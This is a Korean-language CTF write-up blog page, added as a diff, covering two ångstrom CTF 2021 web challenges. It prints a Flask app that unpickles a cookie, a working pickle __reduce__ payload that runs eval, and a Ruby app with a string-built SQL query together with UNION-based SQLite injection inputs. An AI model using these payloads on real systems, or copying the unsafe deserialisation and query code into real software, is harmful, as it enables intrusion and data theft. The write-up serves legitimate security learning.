@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="심심해서 4일에 1시간 정도했는데 역시 해킹은 취미가 딱인 거 같다 :)  (Web) Jar [70 pts] Jar 문제는 Python Pickle 모듈에서 발생하는 역직렬화 RCE 취약점을 이용해 플래그를 획득하는 문제입니다.  12345678910111213141516171819202122232425262728293031323334from flask i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ångstrom CTF 2021 Write Up">
+<meta property="og:url" content="http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="심심해서 4일에 1시간 정도했는데 역시 해킹은 취미가 딱인 거 같다 :)  (Web) Jar [70 pts] Jar 문제는 Python Pickle 모듈에서 발생하는 역직렬화 RCE 취약점을 이용해 플래그를 획득하는 문제입니다.  12345678910111213141516171819202122232425262728293031323334from flask i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/3.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/1.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/2.png?raw=true">
+<meta property="article:published_time" content="2021-04-04T00:00:11.000Z">
+<meta property="article:modified_time" content="2021-04-08T01:24:32.576Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ångstrom CTF 2021 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/03/21/2021-03-21-Line-CTF-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&text=ångstrom CTF 2021 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&is_video=false&description=ångstrom CTF 2021 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ångstrom CTF 2021 Write Up&body=Check out this article: http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&name=ångstrom CTF 2021 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&t=ångstrom CTF 2021 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Jar-70-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Jar [70 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Sea-of-Quills-70-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Sea of Quills [70 pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ångstrom CTF 2021 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-04T00:00:11.000Z" itemprop="datePublished">2021-04-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>심심해서 4일에 1시간 정도했는데 역시 해킹은 취미가 딱인 거 같다 :)</p>
+<hr>
+<h2 id="Web-Jar-70-pts"><a href="#Web-Jar-70-pts" class="headerlink" title="(Web) Jar [70 pts]"></a>(Web) Jar [70 pts]</h2><blockquote>
+<p>Jar 문제는 Python Pickle 모듈에서 발생하는 역직렬화 RCE 취약점을 이용해 플래그를 획득하는 문제입니다.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;actf&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle.jpg&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span>():</span></span><br><span class="line">	<span class="keyword">return</span> send_file(<span class="string">&#x27;pickle.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span>():</span></span><br><span class="line">	contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line">	<span class="keyword">else</span>: items = []</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;&#x27;</span> + \</span><br><span class="line">		<span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;&quot;&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;&#x27;</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">	contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line">	<span class="keyword">else</span>: items = []</span><br><span class="line">	items.append(request.form[<span class="string">&#x27;item&#x27;</span>])</span><br><span class="line">	response = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">	response.set_cookie(<span class="string">&#x27;contents&#x27;</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>소스 코드를 보면 플래그는 <code>flag</code> 변수에 들어가 있는 것을 볼 수 있습니다. 그리고 index를 보면 <code>contentes</code>라는 쿠키의 값을 가져와서 <code>loads()</code> 함수의 인자 넘겨주기 때문에 역직렬화 취약점이 발생합니다. 그러니 역직렬화 취약점을 이용햇 REC를 트리거해서 템블릿 변수로 <code>flag</code> 변수를 넘겨주면 될 거 같습니다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&#123;flag&#125;&quot;</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(exploit())))</span><br><span class="line"><span class="comment"># b&#x27;gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>위와 같이 익스 코드를 작성해주었습니다.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true"></p>
+<p><code>contentes</code>라는 쿠키의 값으로 위 페이로드를 넘겨주니 플래그를 얻을 수 있었습니다.</p>
+<blockquote>
+<p>FLAG : actf{you_got_yourself_out_of_a_pickle}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Sea-of-Quills-70-pts"><a href="#Web-Sea-of-Quills-70-pts" class="headerlink" title="(Web) Sea of Quills [70 pts]"></a>(Web) Sea of Quills [70 pts]</h2><blockquote>
+<p>Sea of Quills 문제는 SQLite Injection 문제입니다.</p>
+</blockquote>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sqlite3&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:bind</span>, <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">set <span class="symbol">:port</span>, <span class="number">4567</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">	db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line">	<span class="variable">@row</span> = db.execute( <span class="string">&quot;select * from quills&quot;</span> )</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	erb <span class="symbol">:index</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">	erb <span class="symbol">:quills</span>	</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">	db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line">	cols = params[<span class="symbol">:cols</span>]</span><br><span class="line">	lim = params[<span class="symbol">:limit</span>]</span><br><span class="line">	off = params[<span class="symbol">:offset</span>]</span><br><span class="line">	</span><br><span class="line">	blacklist = [<span class="string">&quot;-&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>]</span><br><span class="line">	</span><br><span class="line">	blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line">		<span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;beep boop sqli detected!&quot;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;bad, no quills for you!&quot;</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">@row</span> = db.execute(<span class="string">&quot;select %s from quills limit %s offset %s&quot;</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">	p @row</span><br><span class="line"></span><br><span class="line">	erb <span class="symbol">:specific</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>문제에서 소스 코드를 제공해주는데 루비인 것을 볼 수 있습니다. 코드를 보면 <code>cols</code>, <code>limit</code>, <code>offset</code>의 값을 가져와서 필터링 검증을 하고, 쿼리문 내에 넣은 후에 <code>execute()</code> 함수르 이용해서 쿼리르 실행하는 것을 볼 수 있습니다.</p>
+<p>여기서 <code>union</code> 키워드를 필터링하지 않아 쿼리를 2개 이상 실행시켜줄 수 있을 거 같습니다. cols에 값을 <code>select</code>와 <code>from</code>에 사이에 넣어주는 것을 볼 수 있는데 만약 <code>sql from sqlite union select &lt;column&gt;</code>을 넣어준다면 SQL Injection을 할 수 있습니다.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/3.png?raw=true"></p>
+<p>요청을 보내보니 <code>cols</code>의 값으로 <code>url</code>, <code>desc</code>, <code>name</code>이 넘어가는 것을 보아 이 3개가 <code>quills</code> 테이블의 존재하는 컬럼인 거 같습니다.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/1.png?raw=true"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : sql from sqlite_msater union select url</span><br></pre></td></tr></table></figure>
+<p>위와 같이 보내주니 메타 테이블 <code>sqlite_master</code>를 잘 참조하는 것을 볼 수 있고, 여기서 <code>flagtable</code>라는 테이블에 <code>flag</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/2.png?raw=true"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : flag from flagtable union select url</span><br></pre></td></tr></table></figure>
+<p>마지막을 위와 같이 <code>flagtable</code> 테이블을 참조하니 플래그가 나오는 것을 볼 수 있었습니다.</p>
+<blockquote>
+<p>FLAG : actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}</p>
+</blockquote>
+<hr>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Jar-70-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Jar [70 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Sea-of-Quills-70-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Sea of Quills [70 pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&text=ångstrom CTF 2021 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&is_video=false&description=ångstrom CTF 2021 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ångstrom CTF 2021 Write Up&body=Check out this article: http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&title=ångstrom CTF 2021 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&name=ångstrom CTF 2021 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/&t=ångstrom CTF 2021 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'https-pocas-kr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
